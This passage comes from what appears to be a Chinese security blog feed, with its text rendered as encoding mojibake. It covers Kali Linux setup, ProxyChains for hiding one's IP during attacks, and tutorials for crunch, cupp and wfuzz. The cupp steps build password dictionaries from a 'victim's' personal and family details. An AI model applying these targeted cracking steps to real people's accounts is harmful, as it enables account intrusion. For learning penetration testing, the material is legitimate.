æ¸…åå¤§å­¦</span>deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free<span class="token comment"># ä¸­ç§‘å¤§</span>deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</code></pre><h5 id="æ›´æ–°"><a href="#æ›´æ–°" class="headerlink" title="æ›´æ–°"></a>æ›´æ–°</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> update  <span class="token comment"># æ›´æ–°æº</span><span class="token function">apt</span> upgrade <span class="token comment"># æµ‹è¯•é•œåƒæº</span></code></pre><h4 id="å®‰è£…è¾“å…¥æ³•"><a href="#å®‰è£…è¾“å…¥æ³•" class="headerlink" title="å®‰è£…è¾“å…¥æ³•"></a>å®‰è£…è¾“å…¥æ³•</h4><p>è¿™é‡Œä»¥ibusè¾“å…¥æ³•ä¸ºä¾‹</p><p>å®‰è£…è¾“å…¥æ³•æ¡†æ¶</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> ibus ibus-pinyin</code></pre><p>ç„¶åé‡å¯</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">reboot</span></code></pre><p>ç„¶åé…ç½®ibusæ·»åŠ ä¸­æ–‡å³å¯</p><h4 id="é…ç½®ä»£ç†"><a href="#é…ç½®ä»£ç†" class="headerlink" title="é…ç½®ä»£ç†"></a>é…ç½®ä»£ç†</h4><p>Kaliä¸­å†…ç½®äº†ProxyChainså¼€æºä»£ç†å·¥å…·ï¼Œé€šè¿‡ä½¿ç”¨è¿™ä¸ªå·¥å…·ï¼Œå¯ä»¥è®©æˆ‘ä»¬éšè—çœŸå®ipå®ç°æ”»å‡»ã€ä»£ç†ä¸Šç½‘ç­‰</p><p>ä½¿ç”¨<code>ProxyChains</code>ï¼Œç”¨æˆ·å¯ä»¥åœ¨Kali Linuxä¸­é…ç½®ä¸åŒç±»å‹çš„ä»£ç†æœåŠ¡å™¨ï¼ŒåŒ…æ‹¬<code>HTTP</code>ã€<code>SOCKS4</code>å’Œ<code>SOCKS5</code>ä»£ç†ã€‚æ­¤å¤–ï¼Œç”¨æˆ·è¿˜å¯ä»¥ä¸ºä¸åŒçš„ç›®æ ‡æŒ‡å®šä¸åŒçš„ä»£ç†æœåŠ¡å™¨ï¼Œä»¥ç¡®ä¿ä»–ä»¬çš„è¡Œä¸ºä¸è¢«æ£€æµ‹åˆ°æˆ–è·Ÿè¸ªã€‚</p><h5 id="ç¼–è¾‘é…ç½®æ–‡ä»¶"><a href="#ç¼–è¾‘é…ç½®æ–‡ä»¶" class="headerlink" title="ç¼–è¾‘é…ç½®æ–‡ä»¶"></a>ç¼–è¾‘é…ç½®æ–‡ä»¶</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/proxychains4.conf</code></pre><p><img src="proxy.png" loading="lazy"></p><p>æ³¨é‡Š<code>strict_chain</code></p><p>å–æ¶ˆ<code>dynamic_chain</code>çš„æ³¨é‡Š</p><p>ç„¶åç§»è‡³æœ€åä¸€è¡Œï¼Œå¡«å†™å¯¹åº”IPå’Œç«¯å£</p><p>æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯clash for Windowsï¼Œè™šæ‹Ÿæœºé‡‡ç”¨NATè¿æ¥</p><p>é¦–å…ˆåœ¨Windows cmdä¸‹<code>ipconfig</code>ï¼ŒæŸ¥è¯¢NATæ¨¡å¼çš„IP</p><p><img src="proxy_2.png" loading="lazy"></p><p><img src="proxy_3.png" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash">socks4 <span class="token number">192.168</span>.2.1 <span class="token number">7890</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux </tag>
            
            <tag> ç¯å¢ƒæ­å»º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å­—å…¸ç”Ÿæˆä¸å¯†ç çˆ†ç ´</title>
      <link href="/2024/08/08/%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E4%B8%8E%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
      <url>/2024/08/08/%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E4%B8%8E%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<h3 id="å­—å…¸ç”Ÿæˆå·¥å…·"><a href="#å­—å…¸ç”Ÿæˆå·¥å…·" class="headerlink" title="å­—å…¸ç”Ÿæˆå·¥å…·"></a>å­—å…¸ç”Ÿæˆå·¥å…·</h3><h4 id="crunch"><a href="#crunch" class="headerlink" title="crunch"></a>crunch</h4><h5 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h5><pre class="language-http" data-language="http"><code class="language-http"># æºç <span class="token header"><span class="token header-name keyword">https</span><span class="token punctuation">:</span><span class="token header-value">//github.com/crunchsec/crunch</span></span></code></pre><p><strong>Crunch</strong>ä¸º<strong>kali</strong>è‡ªå¸¦å·¥å…·ä¹‹ä¸€ï¼Œæ˜¯ä¸€ç§è‡ªå®šä¹‰åˆ›å»ºå¯†ç å­—å…¸å·¥å…·ï¼ŒæŒ‰ç…§æŒ‡å®šçš„è§„åˆ™ç”Ÿæˆå¯†ç å­—å…¸ï¼Œå¯ä»¥é’ˆå¯¹æ€§çš„ç”Ÿæˆå­—å…¸æ–‡ä»¶</p><h5 id="ä½¿ç”¨è¯­æ³•å’Œå‚æ•°"><a href="#ä½¿ç”¨è¯­æ³•å’Œå‚æ•°" class="headerlink" title="ä½¿ç”¨è¯­æ³•å’Œå‚æ•°"></a>ä½¿ç”¨è¯­æ³•å’Œå‚æ•°</h5><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token operator">&lt;</span>min<span class="token operator">></span> <span class="token operator">&lt;</span>max<span class="token operator">></span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span></code></pre><p>å‚æ•°è¯¦è§£</p><pre class="language-bash" data-language="bash"><code class="language-bash">min    è®¾å®šæœ€å°å­—ç¬¦ä¸²é•¿åº¦ï¼ˆå¿…é€‰ï¼‰max    è®¾å®šæœ€å¤§å­—ç¬¦ä¸²é•¿åº¦ï¼ˆå¿…é€‰ï¼‰oprions<span class="token parameter variable">-b</span>     æŒ‡å®šæ–‡ä»¶è¾“å‡ºçš„å¤§å°ï¼Œé¿å…å­—å…¸æ–‡ä»¶è¿‡å¤§  <span class="token parameter variable">-c</span>     æŒ‡å®šæ–‡ä»¶è¾“å‡ºçš„è¡Œæ•°ï¼Œå³åŒ…å«å¯†ç çš„ä¸ªæ•°<span class="token parameter variable">-d</span>     é™åˆ¶ç›¸åŒå…ƒç´ å‡ºç°çš„æ¬¡æ•°<span class="token parameter variable">-e</span>     å®šä¹‰åœæ­¢å­—ç¬¦ï¼Œå³åˆ°è¯¥å­—ç¬¦ä¸²å°±åœæ­¢ç”Ÿæˆ<span class="token parameter variable">-f</span>     è°ƒç”¨åº“æ–‡ä»¶ï¼ˆ/etc/share/crunch/charset.lstï¼‰<span class="token parameter variable">-i</span>     æ”¹å˜è¾“å‡ºæ ¼å¼ï¼Œå³aaa,aab -<span class="token operator">></span> aaa,baa<span class="token parameter variable">-I</span>     é€šå¸¸ä¸-tè”åˆä½¿ç”¨ï¼Œè¡¨æ˜è¯¥å­—ç¬¦ä¸ºå®ä¹‰å­—ç¬¦<span class="token parameter variable">-m</span>     é€šå¸¸ä¸-pæ­é…<span class="token parameter variable">-o</span>     å°†å¯†ç ä¿å­˜åˆ°æŒ‡å®šæ–‡ä»¶<span class="token parameter variable">-p</span>     æŒ‡å®šå…ƒç´ ä»¥ç»„åˆçš„æ–¹å¼è¿›è¡Œ<span class="token parameter variable">-q</span>     è¯»å–å¯†ç æ–‡ä»¶ï¼Œå³è¯»å–pass.txt<span class="token parameter variable">-r</span>     å®šä¹‰é‡æŸä¸€å­—ç¬¦ä¸²é‡æ–°å¼€å§‹<span class="token parameter variable">-s</span>     æŒ‡å®šä¸€ä¸ªå¼€å§‹çš„å­—ç¬¦ï¼Œå³ä»è‡ªå·±å®šä¹‰çš„å¯†ç xxxxå¼€å§‹<span class="token parameter variable">-t</span>     æŒ‡å®šå¯†ç è¾“å‡ºçš„æ ¼å¼<span class="token parameter variable">-u</span>     ç¦æ­¢æ‰“å°ç™¾åˆ†æ¯”ï¼ˆå¿…é¡»ä¸ºæœ€åä¸€ä¸ªé€‰é¡¹ï¼‰<span class="token parameter variable">-z</span>     å‹ç¼©ç”Ÿæˆçš„å­—å…¸æ–‡ä»¶ï¼Œæ”¯æŒgzip,bzip2,lzma,7z  </code></pre><p>ç‰¹æ®Šå­—ç¬¦</p><pre class="language-bash" data-language="bash"><code class="language-bash">%      ä»£è¡¨æ•°å­—^      ä»£è¡¨ç‰¹æ®Šç¬¦å·@      ä»£è¡¨å°å†™å­—æ¯,      ä»£è¡¨å¤§å†™å­—ç¬¦   </code></pre><h5 id="å®è·µæ¡ˆä¾‹"><a href="#å®è·µæ¡ˆä¾‹" class="headerlink" title="å®è·µæ¡ˆä¾‹"></a>å®è·µæ¡ˆä¾‹</h5><p>1.ç”Ÿæˆæœ€å°ä¸º5,æœ€å¤§ä¸º6ï¼Œç”¨è‡ªå·±æŒ‡å®šçš„å­—ç¬¦abcdef(é»˜è®¤ä¸º26ä¸ªå°å†™å­—æ¯ä¸ºå…ƒç´ çš„æ‰€æœ‰ç»„åˆ)</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">crunch <span class="token number">5</span> <span class="token number">6</span> abcdef</code></pre><p>2.ç”Ÿæˆæœ€å°ä¸º5,æœ€å¤§ä¸º6ï¼Œç”±abcdefgå’Œç©ºæ ¼ä¸ºå…ƒç´ çš„æ‰€æœ‰ç»„åˆ(&#x2F;ä»£è¡¨ç©ºæ ¼)</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">crunch <span class="token number">5</span> <span class="token number">6</span> abcdefg\ æˆ–è€… crunch <span class="token number">5</span> <span class="token number">6</span> <span class="token string">"abcdefg "</span></code></pre><p>3.å¤šç§ç»„åˆ ç”Ÿæˆ3ä¸ªå…ƒç´ çš„ç»„åˆï¼Œå‰ä¸‰ä½ä¸ºå®šä¹‰çš„å­—ç¬¦ä¸²</p><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">3</span> <span class="token number">3</span> <span class="token parameter variable">-t</span> d@% <span class="token parameter variable">-p</span> aaa bbb </code></pre><p>4.ç”Ÿæˆå‡ ä¸ªå…ƒç´ çš„ç»„åˆï¼ˆå¯ä»¥ç”¨äºç¤¾å·¥ä¸­æ”¶é›†çš„ä¿¡æ¯ï¼‰</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">crunch <span class="token number">4</span> <span class="token number">4</span> <span class="token operator">-</span>p zhangsan <span class="token number">2018</span> <span class="token number">0101</span> <span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>5.ç”ŸæˆæŒ‡å®šçš„å­—ç¬¦ä¸²ï¼ˆæ¯”å¦‚ç”Ÿæˆç¼–å·ï¼Œæ‰‹æœºå·ç­‰ï¼‰</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">crunch <span class="token number">10</span> <span class="token number">10</span> <span class="token operator">-</span>t <span class="token number">201800</span><span class="token operator">%</span><span class="token operator">%</span><span class="token operator">%</span><span class="token operator">%</span></code></pre><p><img src="crunch.png" loading="lazy"></p><p>6.é€šè¿‡-lå‚æ•°æ¥ä½¿@,%^ç­‰ç‰¹æ®Šå­—ç¬¦è¾“å‡º</p><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">7</span> <span class="token number">7</span> <span class="token parameter variable">-t</span> p@ss,%^ <span class="token parameter variable">-l</span> a@aaaaa</code></pre><p>7.-oå‚æ•°ä¹Ÿå¯ä½¿ç”¨&gt;&gt;æ¥ç®€åŒ–</p><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">4</span> <span class="token number">4</span> <span class="token parameter variable">-d</span> <span class="token number">2</span>@ <span class="token parameter variable">-t</span> @@@% <span class="token operator">>></span> test.txt</code></pre><h5 id="è°ƒç”¨å¯†ç åº“"><a href="#è°ƒç”¨å¯†ç åº“" class="headerlink" title="è°ƒç”¨å¯†ç åº“"></a>è°ƒç”¨å¯†ç åº“</h5><p><img src="crunch_2.png" loading="lazy"></p><p>ç‰¹æ®Šå­—ç¬¦</p><pre class="language-bash" data-language="bash"><code class="language-bash">numeric     è¡¨ç¤º0123456789Lalpha      è¡¨ç¤º26ä½å°å†™å­—æ¯Ualpha      è¡¨ç¤º26ä½å¤§å†™å­—æ¯</code></pre><p>å®ä¾‹ï¼šè°ƒç”¨å¯†ç åº“ charset.lstä¸­çš„ hex-upperé¡¹ç›®å­—ç¬¦ï¼Œç”Ÿæˆ4ä½å¯†ç ï¼Œå…¶ä¸­æ ¼å¼ä¸º@ + hex-upper +% +%</p><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">4</span> <span class="token number">4</span> <span class="token parameter variable">-f</span> charset.lst hex-upper <span class="token parameter variable">-t</span> @@%% <span class="token parameter variable">-l</span> @aaa</code></pre><h4 id="cupp-ccupp"><a href="#cupp-ccupp" class="headerlink" title="cupp(ccupp)"></a>cupp(ccupp)</h4><h5 id="ç®€ä»‹-1"><a href="#ç®€ä»‹-1" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h5><p>cuppæ˜¯ä¸€æ¬¾åŸºäºpythonç¼–å†™çš„å¯äº¤äº’æ€§çš„å¯†ç å­—å…¸ç”Ÿæˆå·¥å…·ã€‚ç»“åˆç¤¾ä¼šå·¥ç¨‹å­¦ï¼Œä½ ä¼šè·å¾—ä¸€ä»½æ ¹æ®ä¸ªäººä¿¡æ¯ç”Ÿæˆçš„ä¸“å±å­—å…¸ã€‚</p><p>ä¸ä¼ ç»Ÿå­—å…¸ç›¸æ¯”ï¼Œå…¶ä¼˜åŠ¿åœ¨äºå‡†ç¡®ç‡æ›´é«˜</p><h5 id="cuppå¸¸ç”¨å‘½ä»¤"><a href="#cuppå¸¸ç”¨å‘½ä»¤" class="headerlink" title="cuppå¸¸ç”¨å‘½ä»¤"></a>cuppå¸¸ç”¨å‘½ä»¤</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-h</span>å¸¸çœ‹å¸®åŠ©ä¿¡æ¯<span class="token parameter variable">-i</span>é€šè¿‡å¡«å†™ä¿¡æ¯åˆ›å»ºç”¨æˆ·å¯†ç å­—å…¸<span class="token parameter variable">-w</span>åœ¨å·²å­˜åœ¨çš„å­—å…¸è¿›è¡Œæ‰©å±•<span class="token parameter variable">-l</span>ä»githubä»“åº“ä¸‹è½½å­—å…¸<span class="token parameter variable">-v</span>æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯<span class="token parameter variable">-q</span>å®‰é™æ¨¡å¼</code></pre><h5 id="ç”Ÿæˆå­—å…¸"><a href="#ç”Ÿæˆå­—å…¸" class="headerlink" title="ç”Ÿæˆå­—å…¸"></a>ç”Ÿæˆå­—å…¸</h5><ol><li><p>è¿è¡Œå‘½ä»¤â€cupp -iâ€,å¡«å†™å—å®³äººå§“ã€åã€ç»°å·ã€ç”Ÿæ—¥ã€‚</p></li><li><p>å¡«å†™å—å®³äººé…å¶çš„åå­—ã€ç»°å·ã€ç”Ÿæ—¥</p></li><li><p>å¡«å†™å­©å­çš„åå­—ã€ç»°å·ã€ç”Ÿæ—¥</p></li><li><p>å¡«å†™å® ç‰©çš„åå­—ä»¥åŠå…¬å¸çš„åå­—</p></li><li><p>æ˜¯å¦æ·»åŠ ä¸€äº›å…³äºå—å®³äººçš„å…³é”®è¯</p></li><li><p>æ˜¯å¦åœ¨å¯†ç ç»“å°¾æ·»åŠ ä¸€äº›ç‰¹æ®Šå­—ç¬¦</p></li><li><p>æ˜¯å¦åœ¨å¯†ç ç»“å°¾æ·»åŠ ä¸€äº›éšæœºæ•°å­—</p></li><li><p>å¡«å†™â€yâ€ï¼Œç”Ÿæˆå­—å…¸ï¼Œå¯ä»¥åœ¨rootç›®å½•ä¸‹æŸ¥çœ‹</p></li></ol><p>è¿è¡Œå‘½ä»¤ â€œcupp -lâ€ ,å¡«å†™ä½ æƒ³è¦ä¸‹è½½å­—å…¸çš„åºå·ï¼Œä¸‹è½½å®Œæˆçš„å­—å…¸ä¿å­˜åœ¨â€&#x2F;root&#x2F;dictionaries&#x2F;chineseâ€ç›®å½•ä¸‹ã€‚</p><h3 id="çˆ†ç ´å·¥å…·"><a href="#çˆ†ç ´å·¥å…·" class="headerlink" title="çˆ†ç ´å·¥å…·"></a>çˆ†ç ´å·¥å…·</h3><h4 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h4><p><a href="https://www.freebuf.com/column/163553.html">å²ä¸Šæœ€è¯¦[ZI]ç»†[DUO]çš„wfuzzä¸­æ–‡æ•™ç¨‹ï¼ˆä¸€ï¼‰â€”â€”åˆè¯†wfuzz</a></p><p><a href="https://www.ddosi.org/wfuzz-guide/">Wfuzzè¯¦ç»†æŒ‡å—|æ¨¡ç³Šæµ‹è¯•å·¥å…·ä½¿ç”¨æ–¹æ³•</a></p><h5 id="ç®€ä»‹-2"><a href="#ç®€ä»‹-2" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h5><p>wfuzz æ˜¯ä¸€æ¬¾Pythonå¼€å‘çš„Webå®‰å…¨æµ‹è¯•å·¥å…·<br>wfuzzä¸ä»…ä»…æ˜¯ä¸€ä¸ªwebæ‰«æå™¨ï¼š</p><ul><li>wfuzzèƒ½å¤Ÿé€šè¿‡å‘ç°å¹¶åˆ©ç”¨ç½‘ç«™å¼±ç‚¹&#x2F;æ¼æ´çš„æ–¹å¼å¸®åŠ©ä½ ä½¿ç½‘ç«™æ›´åŠ å®‰å…¨ã€‚wfuzzçš„æ¼æ´æ‰«æåŠŸèƒ½ç”±æ’ä»¶æ”¯æŒã€‚</li><li>wfuzzæ˜¯ä¸€ä¸ªå®Œå…¨æ¨¡å—åŒ–çš„æ¡†æ¶ï¼Œè¿™ä½¿å¾—å³ä½¿æ˜¯Pythonåˆå­¦è€…ä¹Ÿèƒ½å¤Ÿè¿›è¡Œå¼€å‘å’Œè´¡çŒ®ä»£ç ã€‚å¼€å‘ä¸€ä¸ªwfuzzæ’ä»¶æ˜¯ä¸€ä»¶éå¸¸ç®€å•çš„äº‹ï¼Œé€šå¸¸åªéœ€å‡ åˆ†é’Ÿã€‚</li><li>wfuzzæä¾›äº†ç®€æ´çš„ç¼–ç¨‹è¯­è¨€æ¥å£æ¥å¤„ç†wfuzzæˆ–Burpsuiteè·å–åˆ°çš„HTTPè¯·æ±‚å’Œå“åº”ã€‚è¿™ä½¿å¾—ä½ èƒ½å¤Ÿåœ¨ä¸€ä¸ªè‰¯å¥½çš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è¿›è¡Œæ‰‹å·¥æµ‹è¯•æˆ–åŠè‡ªåŠ¨åŒ–çš„æµ‹è¯•ï¼Œè€Œä¸éœ€è¦ä¾èµ–webå½¢å¼çš„æ‰«æå™¨ã€‚</li></ul><h5 id="ä½¿ç”¨è¯­æ³•å’Œå‚æ•°-1"><a href="#ä½¿ç”¨è¯­æ³•å’Œå‚æ•°-1" class="headerlink" title="ä½¿ç”¨è¯­æ³•å’Œå‚æ•°"></a>ä½¿ç”¨è¯­æ³•å’Œå‚æ•°</h5><pre class="language-javascript" data-language="javascript"><code class="language-javascript">é€‰é¡¹ï¼š<span class="token operator">-</span>h<span class="token operator">/</span><span class="token operator">--</span>helpï¼šå¸®åŠ©<span class="token operator">--</span>helpï¼šé«˜çº§å¸®åŠ©<span class="token operator">--</span>filter<span class="token operator">-</span>helpï¼šç­›é€‰å™¨å¸®åŠ©<span class="token operator">--</span>versionï¼šWfuzzç‰ˆæœ¬è¯¦ç»†ä¿¡æ¯<span class="token operator">-</span>eï¼œtypeï¼ï¼šå¯ç”¨ç¼–ç å™¨<span class="token operator">/</span>æœ‰æ•ˆè´Ÿè½½<span class="token operator">/</span>è¿­ä»£å™¨<span class="token operator">/</span>æ‰“å°æœº<span class="token operator">/</span>è„šæœ¬åˆ—è¡¨<span class="token operator">--</span>recipeï¼œfilenameï¼ï¼šä»é…æ–¹ä¸­è¯»å–é€‰é¡¹ã€‚å¯¹å„ç§é£Ÿè°±é‡å¤ä¸Šè¿°æ­¥éª¤ã€‚<span class="token operator">--</span>dump recipeï¼œfilenameï¼ï¼šå°†å½“å‰é€‰é¡¹æ‰“å°ä¸ºé…æ–¹<span class="token operator">--</span>oFï¼œfilenameï¼ï¼šå°†æ¨¡ç³Šç»“æœä¿å­˜åˆ°æ–‡ä»¶ä¸­ã€‚è¿™äº›å¯ä»¥ç¨åä½¿ç”¨wfuzzæœ‰æ•ˆè´Ÿè½½æ¥ä½¿ç”¨ã€‚<span class="token operator">-</span>cï¼šå¸¦é¢œè‰²çš„è¾“å‡º<span class="token operator">-</span>vï¼šè¯¦ç»†ä¿¡æ¯ã€‚<span class="token operator">-</span>f filenameï¼Œprinterï¼šä½¿ç”¨æŒ‡å®šçš„æ‰“å°æœºï¼ˆå¦‚æœçœç•¥äº†åŸå§‹æ‰“å°æœºï¼‰å°†ç»“æœå­˜å‚¨åœ¨è¾“å‡ºæ–‡ä»¶ä¸­ã€‚<span class="token operator">-</span>o printerï¼šä½¿ç”¨æŒ‡å®šçš„æ‰“å°æœºæ˜¾ç¤ºç»“æœã€‚<span class="token operator">--</span>interact<span class="token operator">:</span>ï¼ˆbetaï¼‰å¦‚æœé€‰ä¸­ï¼Œåˆ™æ•è·æ‰€æœ‰æŒ‰é”®ã€‚è¿™å…è®¸æ‚¨ä¸ç¨‹åºäº¤äº’ã€‚<span class="token operator">--</span>dry<span class="token operator">-</span>runï¼šæ‰“å°åº”ç”¨è¯·æ±‚çš„ç»“æœï¼Œè€Œä¸å®é™…å‘å‡ºä»»ä½•<span class="token constant">HTTP</span>è¯·æ±‚ã€‚<span class="token operator">--</span>prevï¼šæ‰“å°ä»¥å‰çš„<span class="token constant">HTTP</span>è¯·æ±‚ï¼ˆä»…å½“ä½¿ç”¨ç”Ÿæˆæ¨¡ç³Šç»“æœçš„æœ‰æ•ˆè´Ÿè½½æ—¶ï¼‰<span class="token operator">--</span>efieldï¼œexprï¼ï¼šæ˜¾ç¤ºæŒ‡å®šçš„è¯­è¨€è¡¨è¾¾å¼ä»¥åŠå½“å‰è´Ÿè½½ã€‚å¯¹å„ä¸ªå­—æ®µé‡å¤ä¸Šè¿°æ“ä½œã€‚<span class="token operator">--</span>fieldï¼œexprï¼ï¼šä¸æ˜¾ç¤ºæœ‰æ•ˆè´Ÿè½½ï¼Œåªæ˜¾ç¤ºæŒ‡å®šçš„è¯­è¨€è¡¨è¾¾å¼ã€‚å¯¹å„ä¸ªå­—æ®µé‡å¤ä¸Šè¿°æ“ä½œã€‚<span class="token operator">-</span>p addrï¼šä½¿ç”¨ip<span class="token operator">:</span>port<span class="token operator">:</span>typeæ ¼å¼çš„ä»£ç†ã€‚é‡å¤ä½¿ç”¨å„ç§ä»£ç†çš„é€‰é¡¹ã€‚å¦‚æœçœç•¥ï¼Œç±»å‹å¯ä»¥æ˜¯<span class="token constant">SOCKS4</span>ã€<span class="token constant">SOCKS5</span>æˆ–<span class="token constant">HTTP</span>ã€‚<span class="token operator">-</span>t <span class="token constant">N</span>ï¼šæŒ‡å®šå¹¶å‘è¿æ¥æ•°ï¼ˆé»˜è®¤å€¼ä¸º<span class="token number">10</span>ï¼‰<span class="token operator">-</span>s <span class="token constant">N</span>ï¼šæŒ‡å®šè¯·æ±‚ä¹‹é—´çš„æ—¶é—´å»¶è¿Ÿï¼ˆé»˜è®¤å€¼ä¸º<span class="token number">0</span>ï¼‰<span class="token operator">-</span><span class="token constant">R</span> depthï¼šé€’å½’è·¯å¾„å‘ç°æ·±åº¦æ˜¯æœ€å¤§é€’å½’çº§åˆ«ã€‚<span class="token operator">-</span><span class="token constant">D</span> depthï¼šæœ€å¤§é“¾æ¥æ·±åº¦çº§åˆ«ã€‚<span class="token operator">-</span><span class="token constant">L</span><span class="token punctuation">,</span> <span class="token operator">--</span>follow<span class="token operator">:</span>éµå¾ª<span class="token constant">HTTP</span>é‡å®šå‘<span class="token operator">--</span>ip<span class="token operator">-</span>host<span class="token operator">:</span>portï¼šä»¥ip<span class="token operator">:</span>portæ ¼å¼æŒ‡å®šè¦è¿æ¥çš„ipï¼Œè€Œä¸æ˜¯<span class="token constant">URL</span>çš„ä¸»æœº<span class="token operator">-</span><span class="token constant">Z</span>ï¼šæ‰«ææ¨¡å¼ï¼ˆå°†å¿½ç•¥è¿æ¥é”™è¯¯ï¼‰ã€‚<span class="token operator">--</span>req delay <span class="token constant">N</span>ï¼šè®¾ç½®è¯·æ±‚å…è®¸çš„æœ€é•¿æ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ï¼ˆ<span class="token constant">CURLOPT_TIMEOUT</span>ï¼‰ã€‚é»˜è®¤å€¼<span class="token number">90</span>ã€‚<span class="token operator">--</span>conn<span class="token operator">-</span>delay <span class="token constant">N</span>ï¼šè®¾ç½®æœåŠ¡å™¨è¿æ¥é˜¶æ®µè¦èŠ±è´¹çš„æœ€é•¿æ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ï¼ˆ<span class="token constant">CURLOPT_CONNECTTIMEOUT</span>ï¼‰ã€‚é»˜è®¤å€¼<span class="token number">90</span>ã€‚<span class="token operator">-</span><span class="token constant">A</span><span class="token punctuation">,</span> <span class="token operator">--</span><span class="token constant">AA</span><span class="token punctuation">,</span> <span class="token operator">--</span><span class="token constant">AAA</span><span class="token operator">:</span> <span class="token operator">--</span>script<span class="token operator">=</span><span class="token keyword">default</span>ï¼Œverboseï¼Œdiscovery<span class="token operator">-</span>v<span class="token operator">-</span>cçš„åˆ«å<span class="token operator">--</span>no<span class="token operator">-</span>cacheï¼šç¦ç”¨æ’ä»¶ç¼“å­˜ã€‚å°†æ‰«ææ¯ä¸ªè¯·æ±‚ã€‚<span class="token operator">--</span>script<span class="token operator">=</span>ï¼šç›¸å½“äº<span class="token operator">--</span>script<span class="token operator">=</span>é»˜è®¤å€¼<span class="token operator">--</span>script<span class="token operator">=</span><span class="token operator">&lt;</span>plugins<span class="token operator">></span>ï¼šè¿è¡Œè„šæœ¬çš„æ‰«æ<span class="token operator">&lt;</span>plugins<span class="token operator">></span>æ˜¯ä»¥é€—å·åˆ†éš”çš„æ’ä»¶æ–‡ä»¶æˆ–æ’ä»¶ç±»åˆ«åˆ—è¡¨<span class="token operator">--</span>script help<span class="token operator">=</span><span class="token operator">&lt;</span>plugins<span class="token operator">></span>ï¼šæ˜¾ç¤ºæœ‰å…³è„šæœ¬çš„å¸®åŠ©ã€‚<span class="token operator">--</span>script<span class="token operator">-</span>args n1<span class="token operator">=</span>v1ï¼Œâ€¦ï¼šä¸ºè„šæœ¬æä¾›å‚æ•°ã€‚å³<span class="token operator">--</span>script args grep<span class="token punctuation">.</span>regex<span class="token operator">=</span>â€œ<span class="token operator">&lt;</span><span class="token constant">A</span> href<span class="token operator">=</span>\â€ï¼ˆ<span class="token punctuation">.</span><span class="token operator">*</span>ï¼Ÿï¼‰\â€œ<span class="token operator">></span>â€<span class="token operator">-</span>u urlï¼šæŒ‡å®šè¯·æ±‚çš„urlã€‚<span class="token operator">-</span>m iteratorï¼šæŒ‡å®šç”¨äºç»„åˆæœ‰æ•ˆè½½è·çš„è¿­ä»£å™¨ï¼ˆé»˜è®¤ä¸ºproductï¼‰<span class="token operator">-</span>z payloadï¼šä»¥åç§°<span class="token punctuation">[</span>ï¼Œå‚æ•°<span class="token punctuation">]</span><span class="token punctuation">[</span>ï¼Œç¼–ç å™¨<span class="token punctuation">]</span>çš„å½¢å¼ä¸ºæ¯ä¸ª<span class="token constant">FUZZ</span>å…³é”®å­—æŒ‡å®šæœ‰æ•ˆè´Ÿè½½ã€‚å¯ä»¥ä½¿ç”¨ç¼–ç å™¨åˆ—è¡¨ï¼Œå³md5<span class="token operator">-</span>sha1ã€‚ç¼–ç å™¨å¯ä»¥æ˜¯é“¾å¼çš„ï¼Œå³ã€‚md5@sha1<span class="token punctuation">.</span>å¯ä»¥ä½¿ç”¨ç¼–ç å™¨ç±»åˆ«ã€‚å³urlä½¿ç”¨å¸®åŠ©ä½œä¸ºæœ‰æ•ˆè´Ÿè½½æ¥æ˜¾ç¤ºæœ‰æ•ˆè´Ÿè½½æ’ä»¶çš„è¯¦ç»†ä¿¡æ¯ï¼ˆæ‚¨å¯ä»¥ä½¿ç”¨<span class="token operator">--</span>sliceè¿›è¡Œè¿‡æ»¤ï¼‰<span class="token operator">--</span>zPï¼œparamsï¼ï¼šæŒ‡å®šæœ‰æ•ˆè´Ÿè½½çš„å‚æ•°ï¼ˆå¿…é¡»ä»¥<span class="token operator">-</span>zæˆ–<span class="token operator">-</span>wå¼€å¤´ï¼‰ã€‚<span class="token operator">--</span>zD<span class="token operator">&lt;</span><span class="token keyword">default</span><span class="token operator">></span>ï¼šæŒ‡å®šæœ‰æ•ˆè´Ÿè½½çš„é»˜è®¤å‚æ•°ï¼ˆå¿…é¡»ä»¥<span class="token operator">-</span>zæˆ–<span class="token 